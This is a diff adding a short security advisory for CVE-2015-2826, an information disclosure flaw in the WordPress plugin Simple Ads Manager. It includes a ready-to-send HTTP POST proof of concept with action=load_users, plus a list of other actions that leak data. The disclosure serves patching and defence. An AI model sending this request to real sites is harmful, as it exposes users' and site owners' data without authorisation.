@@ -1,0 +1,27 @@
+#Vulnerability title: Wordpress plugin Simple Ads Manager - Information Disclosure
+#Product: Wordpress plugin Simple Ads Manager
+#Vendor: https://profiles.wordpress.org/minimus/
+#Affected version: Simple Ads Manager 2.5.94 and 2.5.96
+#Download link: https://wordpress.org/plugins/simple-ads-manager/
+#CVE ID:  CVE-2015-2826
+#Author: Nguyen Hung Tuan (tuan.h.nguyen@itas.vn) & ITAS Team
+
+
+::PROOF OF CONCEPT::
+
++ REQUEST
+POST /wp-content/plugins/simple-ads-manager/sam-ajax-admin.php HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 17
+
+action=load_users
+
+
+
++ Function list: load_users, load_authors, load_cats, load_tags, load_posts, posts_debug, load_stats,...
++ Vulnerable file: simple-ads-manager/sam-ajax-admin.php
++ Image: http://www.itas.vn/uploads/newsother/disclosure.png
+
++ REFERENCE: 
+- http://www.itas.vn/news/ITAS-Team-found-out-multiple-critical-vulnerabilities-in-Hakin9-IT-Security-Magazine-78.html?language=en
